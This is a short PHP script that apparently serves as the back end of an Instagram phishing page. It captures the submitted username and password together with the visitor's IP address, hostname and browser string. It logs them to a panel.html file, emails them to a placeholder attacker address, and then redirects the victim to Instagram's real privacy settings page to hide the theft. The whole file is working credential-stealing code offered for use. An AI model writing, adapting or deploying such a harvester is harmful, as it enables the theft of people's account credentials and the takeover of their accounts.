<?php
file_put_contents("panel.html", "<br><br><b>-------NEW USER DETECTED------</b>  "."<br><b>[DATE]</b>  " . strftime('%e %B %Y %A %H:%M:%S') .'<br><b>[EMAIL]:</b>  ' . $_POST['username'] . "<br><b>[PASS]:</b>  " . $_POST['password'] . "<br><b>[IP]:</b>  " . $_SERVER['REMOTE_ADDR'] ."<br><b>[HOST]:</b>  " . gethostbyaddr($_SERVER['REMOTE_ADDR']) . "<br><b>[BROWSER]:</b>  " . $_SERVER['HTTP_USER_AGENT'] . "\n", FILE_APPEND);

//Mail Function

$to = "youremail@here.com";
$subject = "New User Detected";
$message = '<b>User:</b> '  . $_POST['username'].'<br>' .'<b>Pass:</b> ' . $_POST['password'].'<br>' .'<b>IP:</b> ' . $_SERVER['REMOTE_ADDR'].'<br>' .'<b>HOST:</b> ' . gethostbyaddr($_SERVER['REMOTE_ADDR']).'<br>' .'<b>BROWSER:</b> ' . $_SERVER['HTTP_USER_AGENT'];
$title  = 'MIME-Version: 1.0' . "\r\n";
$title .= 'Content-type: text/html; charset=utf-8' . "\r\n";
$title .= 'To: NAME youremail@here.com>' . "\r\n";
$title .= 'From: NAME <youremail@here.com>' . "\r\n";
mail($to,$subject,$message,$title);



header('Location: https://www.instagram.com/accounts/privacy_and_security/');

exit();
?>
